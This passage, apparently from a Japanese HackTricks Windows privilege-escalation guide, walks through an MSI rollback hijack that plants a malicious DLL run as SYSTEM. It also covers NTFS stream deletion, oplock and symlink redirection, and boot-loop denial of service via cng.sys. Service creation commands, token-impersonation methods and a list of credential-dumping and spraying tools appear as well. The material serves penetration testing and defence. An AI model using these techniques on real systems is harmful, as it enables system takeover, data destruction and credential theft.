この削除 primitive は、以下の rollback チェーンに利用できます。別個の `Installer\Folders` レコードを保持したまま、保護された `C:\Config.Msi` を削除し、NULL DACL を設定して再作成します。そして、インストーラーが DACL を強化する前に `WRITE_DAC` 権限で取得した handle を保持します。事前に開いた handle を使って `NtSetSecurityObject` で permissive な DACL に戻し、rollback が再開する前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、このパスを修正しました。COM 呼び出しは成功を返すことがありますが、攻撃者が制御するパスは `TempPackages` に追加されなくなります。メソッドの戻り値が成功するかどうかで修正を判定せず、2025 年 4 月の Windows セキュリティ更新プログラムを適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

手法の概要は以下のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空のままにする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - インストーラーを **"UAC Compliant"** としてマークし、**非 admin ユーザー**が実行できるようにします。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: アンインストールを開始する
    - 同じ `.msi` をアンインストールします。
    - アンインストール処理がファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - 開いているファイル handle を **`GetFinalPathNameByHandle` でポーリング**し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: カスタム同期
    - `.msi` に含まれる **カスタムアンインストールアクション（`SyncOnRbfWritten`）** が次の処理を行います。
        - `.rbf` が書き込まれたことを通知します。
        - 続いて、アンインストールを続行する前に別の event を **待機**します。

- Step 4: `.rbf` の削除を阻止する
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに **`.rbf` ファイルを開きます**。これにより **削除を阻止**できます。
    - その後、アンインストールを完了できるように通知を返します。
    - Windows Installer は `.rbf` の削除に失敗し、内容をすべて削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者が `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` が空になり**、Hijack の準備が整います。

> この時点で、**SYSTEM レベルの任意フォルダー削除脆弱性を利用して** `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback スクリプトを悪意あるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` 権限を持つ **handle を開いたままにします**。

- Step 7: 別のインストールを実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的に失敗させる変数。
    - このインストールを使って **rollback** を再度発生させ、`.rbs` と `.rbf` を読み込ませます。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
    - そのファイル名を取得します。

- Step 9: Rollback 前に同期する
    - `.msi` に含まれる **カスタムインストールアクション（`SyncBeforeRollback`）** が次の処理を行います。
        - `.rbs` が作成されたときに event を通知します。
        - 続行する前に **待機**します。

- Step 10: 弱い ACL を再適用する
    - `.rbs created` event を受け取ると、次のことが起こります。
        - Windows Installer が `C:\Config.Msi` に **強い ACL を再適用**します。
        - ただし、`WRITE_DAC` 権限を持つ handle をまだ保持しているため、再び **弱い ACL を適用**できます。

> ACL は **handle を開くときにのみ適用**されるため、引き続きフォルダーに書き込めます。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを上書きし、Windows に次の処理を指示する **偽の rollback script** を書き込みます。
        - `.rbf` ファイル（悪意ある DLL）を **特権のある場所**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **悪意ある SYSTEM レベルの payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback を発生させる
    - 同期 event を通知し、インストーラーを再開させます。
    - **type 19 のカスタムアクション（`ErrorOut`）** は、既知のタイミングでインストールを **意図的に失敗**させるよう設定されています。
    - これにより **rollback が始まります**。

- Step 13: SYSTEM に DLL をインストールさせる
    - Windows Installer は次の処理を行います。
        - 悪意ある `.rbs` を読み込みます。
        - `.rbf` DLL をターゲットの場所にコピーします。
    - これで、**SYSTEM が読み込むパスに悪意ある DLL が配置されます**。

- 最終 Step: SYSTEM 権限でコードを実行する
    - Hijack した DLL を読み込む、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これで**、コードが **SYSTEM として実行されます**。


### 任意のファイル削除/移動/名前変更から SYSTEM EoP へ

主な MSI rollback 手法（前述）は、`C:\Config.Msi` のような **フォルダー全体を削除**できることを前提としています。しかし、脆弱性で **任意のファイル削除**しかできない場合はどうでしょうか？

**NTFS の内部構造**を利用できます。各フォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの `::$INDEX_ALLOCATION` ストリームを**削除**すると、NTFS はファイルシステムからフォルダー全体を**削除**します。

これは、次のような標準のファイル削除 API を使用して実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの中身の削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除できる primitive ではなく、攻撃者が制御するフォルダーの**中身を削除できる** primitive しか使えない場合はどうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって**実行が一時停止します**。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM processをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt`に到達すると、**oplockがトリガーされ**、制御がcallbackに渡されます。

4. Step 4: oplock callback内で削除先をリダイレクトする

- Option A: `file1.txt`を別の場所に移動する
    - oplockを破棄せずに`folder1`を空にできます。
    - `file1.txt`を直接削除しないでください。oplockが早期に解放されてしまいます。

- Option B: `folder1`を**junction**に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを格納する NTFS の内部ストリームを対象としており、これを削除するとフォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは処理を続行し、`file1.txt` を削除しようとします。
- しかし、junction と symlink によって、実際には次のものが削除されます。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: SYSTEM によって `C:\Config.Msi` が削除される。

### 任意のフォルダー作成から永続的な DoS へ

**任意のフォルダーを SYSTEM/admin として作成できる** primitive を悪用します。**ファイルを書き込めない**、または**弱いアクセス許可を設定できない**場合でも可能です。

**重要な Windows ドライバー**の名前を付けた**フォルダー**（ファイルではなく）を作成します。例:
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **事前にフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダーを検出し、**実際のドライバーを解決できず**、**クラッシュするか起動が停止します**。
- **代替手段はなく**、外部から介入しない限り（例：ブート修復やディスクへのアクセス）、**復旧できません**。

### 特権ログ／バックアップパスと OM symlinks による任意ファイルの上書き／起動 DoS

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログ／エクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points**でそのパスをリダイレクトすると、（SeCreateSymbolicLinkPrivilege がなくても）特権による書き込みを任意ファイルの上書きに利用できます。<sup>[[15]](#references)</sup>

**要件**
- 書き込み先のパスを保存した設定ファイルを攻撃者が書き換えられること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）があること。

**攻撃の流れの例**
1. 設定ファイルを読み、特権ログの出力先を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むまで待ちます（例: 管理者が「テスト SMS を送信」を実行）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされたターゲットを調べ（hex/PE parser）、破損を確認します。再起動すると、Windows は改ざんされたドライバーのパスから読み込もうとするため、**boot loop DoS** が発生します。この手法は、特権サービスが書き込み用に開く保護対象ファイル全般に応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合、そちらが先に試されることがあり、破損データを使った確実な DoS の標的になります。



## **High Integrity から System へ**

### **新しいサービス**

すでに High Integrity プロセスで実行している場合、**SYSTEM への昇格**は、新しいサービスを作成して実行するだけで簡単にできることがあります。

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する場合は、有効なserviceであること、または必要な処理を速やかに実行することを確認してください。有効なserviceでない場合、20秒後に終了させられます。

### AlwaysInstallElevated

High Integrityプロセスから、**AlwaysInstallElevatedのレジストリエントリを有効化**し、_**.msi**_ラッパーを使ってreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法について詳しくはこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは**[**こちら**](seimpersonate-from-high-to-system.md)**にあります。**

### SeDebug + SeImpersonateからFull Token privilegesへ

これらのtoken privilegeを持っている場合（おそらく、すでにHigh Integrityのプロセスで見つかるでしょう）、SeDebug privilegeを使って（保護されたプロセス以外の）**ほぼすべてのプロセスを開き**、そのプロセスの**tokenをコピー**して、そのtokenを使って**任意のプロセスを作成**できます。\
この手法では通常、すべてのtoken privilegeを持つSYSTEMとして実行されているプロセスを**選択します**（はい、すべてのtoken privilegeを持たないSYSTEMプロセスもあります）。\
**この手法を実行するコードの**[**例はこちら**](sedebug-+-seimpersonate-copy-token.md)**にあります。**

### **Named Pipes**

この手法は、meterpreterが`getsystem`で権限昇格する際に使われます。手法の内容は、**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**ことです。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**が、pipeのclient（service）のtokenを**偽装**し、SYSTEM privilegeを取得できます。\
[name pipesについて詳しく知りたい場合はこちらをお読みください。](#named-pipe-client-impersonation)\
[name pipesを使ってHigh IntegrityからSystemに移行する方法の例はこちらをお読みください。](from-high-integrity-to-system-with-name-pipes.md)

### Dll Hijacking

**SYSTEMとして実行中のプロセスによってロードされるdllを乗っ取る**ことができれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingはこの種の権限昇格にも有効です。さらに、High Integrityプロセスからであれば、dllのロードに使われるフォルダーへの**書き込み権限**があるため、はるかに**簡単に実行できます**。\
**Dll hijackingについて詳しくは**[**こちら**](dll-hijacking/index.html)**をご覧ください。**

### **AdministratorまたはNetwork ServiceからSystemへ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICEまたはNETWORK SERVICEから完全なprivsへ

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsのローカル権限昇格の手掛かりを探す最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックします（**[**こちらを参照**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 設定ミスの可能性をチェックし、情報を収集します（**[**こちらを参照**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPに保存されたセッション情報を抽出します。ローカル環境では-Thoroughを使ってください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体でsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNSスプーフィングおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc脆弱性を検索します（Watsonに置き換えられたため非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（Admin権限が必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc脆弱性を検索します（VisualStudioを使ってコンパイルする必要があります）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してホストを列挙します（privescツールというより情報収集ツールです）（コンパイルが必要です） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpをC#に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスをチェックします（githubにprecompiled executableがあります）。非推奨です。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスの可能性をチェックします（python製exe）。非推奨です。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿をもとに作成されたツールです（正常に動作するためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを提示します（ローカルのpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを提示します（ローカルのPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは、適切なバージョンの.NETを使ってコンパイルしてください（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている.NETのバージョンは、次の方法で確認できます。

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows権限昇格 - チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux ローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - OSCP完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows権限昇格チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows権限昇格](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester向けWindows権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServerの認証情報を復号 → Veeam CVE-2023-27532でSYSTEMを取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) とkernel tokenの窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: Kernel Shadowsにおける追跡と逃走](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlinkの使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: WindowsでのSymbolic Linkの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windowsでの危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules`フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklistの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - サービスバイナリの乗っ取り](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [MicroslopでのPwn2Own: CLDFLTとDirectX KernelのRace Conditionを連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する一つのI/O Ring: Windows 11における完全な読み書きExploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用した権限昇格とその他の便利なテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPsのExploitコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013、Windows 10のローカル権限昇格1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: イメージ変更が権限昇格につながる場合](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 SSH AgentからSSH秘密鍵を抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 企業のUpdate Serverをバックドア工場に変える (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 企業のUpdate Serverをバックドア工場に変える (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installerフォルダーの削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: 手順をたどりNT AUTHORITY\SYSTEMに戻る](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Servicesの共有メモリオフセットに関する権限昇格アドバイザリ](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
